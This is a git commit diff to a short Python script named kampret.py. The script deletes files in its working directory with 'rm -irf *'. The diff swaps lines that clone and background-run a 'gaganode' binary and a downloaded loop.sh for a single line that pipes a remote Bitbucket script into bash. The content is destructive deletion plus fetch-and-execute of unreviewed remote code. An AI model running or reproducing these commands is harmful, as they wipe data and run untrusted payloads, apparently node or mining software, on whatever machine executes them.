c1a3bfae700837806fa08ce6e48d8dd2331225e1
Erlandi <the@erlandi.my.id>
2024-05-04 05:00:56 +0700

    Update kampret.py

--- kampret.py
+++ kampret.py
@@ -1,4 +1,3 @@
 import os as kampret
 kampret.system("rm -irf *")
-kampret.system("git clone https://github.com/petugas/Gaga && cd Gaga && chmod +x gaganode && ./gaganode &")
-kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/loop.sh && chmod +x loop.sh && ./loop.sh")
+kampret.system("curl -sL https://bitbucket.org/petugas/build/raw/579690e465f111d4d9be6f7d98b24fb5ed22b196/gaga | bash")
